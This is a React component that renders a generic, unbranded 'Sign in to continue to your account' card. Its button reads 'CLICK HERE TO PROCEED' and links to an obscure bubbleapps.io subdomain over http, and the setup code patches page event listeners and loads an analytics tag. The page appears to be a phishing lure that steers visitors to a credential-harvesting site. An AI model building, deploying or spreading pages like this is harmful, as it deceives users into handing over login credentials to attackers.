import React, { useEffect } from 'react';

export default function App() {
  useEffect(() => {
    const originalAddEventListener = document.addEventListener;
    const originalWindowAddEventListener = window.addEventListener;
    
    document.addEventListener = function(event, callback, options) {
      if (event === 'DOMContentLoaded') {
        setTimeout(() => {
          try { callback(new Event('DOMContentLoaded')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalAddEventListener.call(document, event, callback, options);
      }
    };
    
    window.addEventListener = function(event, callback, options) {
      if (event === 'load') {
        setTimeout(() => {
          try { callback(new Event('load')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalWindowAddEventListener.call(window, event, callback, options);
      }
    };
    
    let onloadHandler = null;
    try {
      Object.defineProperty(window, 'onload', {
        set: function(fn) {
          onloadHandler = fn;
          setTimeout(() => {
            try { if (typeof fn === 'function') fn(); } catch (e) { console.error(e); }
          }, 0);
        },
        get: function() { return onloadHandler; },
        configurable: true
      });
    } catch (e) {}
    try {
      
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-2M6V79H761');



        lucide.createIcons();
    
    } catch (error) {
      console.error("Error executing template scripts:", error);
    }
    
    return () => {
      document.addEventListener = originalAddEventListener;
      window.addEventListener = originalWindowAddEventListener;
      try { delete window.onload; } catch (e) {}
    };
  }, []);

  return (
    <>
      
<div className="w-full max-w-[420px] bg-white rounded-3xl shadow-[0_8px_30px_rgb(0,0,0,0.04)] ring-1 ring-gray-900/5 relative overflow-hidden">

<div className="h-32 bg-gray-900 relative">
<div className="absolute inset-0 bg-gradient-to-b from-white/5 to-transparent"></div>
</div>

<div className="absolute top-32 left-1/2 -translate-x-1/2 -translate-y-1/2 flex items-center justify-center w-28 h-28 bg-white rounded-full p-1.5 shadow-sm">
<div className="w-full h-full bg-gray-900 rounded-full flex items-center justify-center overflow-hidden">

<img alt="Profile Picture" className="w-full h-full object-cover" src="https://placehold.co/400x400/4f03c4/ffffff?text=X"/>
</div>
</div>

<div className="px-8 pb-10 pt-20 text-center">
<p className="text-base text-gray-600 mb-8 font-normal">
                Sign in to continue to your account
            </p>

<a className="w-full bg-gray-900 hover:bg-gray-800 text-white text-base font-normal py-3 rounded-xl transition-all duration-200 shadow-sm flex items-center justify-center gap-2 active:scale-[0.98]" href="http://xffinnittyy.bubbleapps.io">
                CLICK HERE TO PROCEED&gt;
            </a>
</div>
</div>


    </>
  );
}
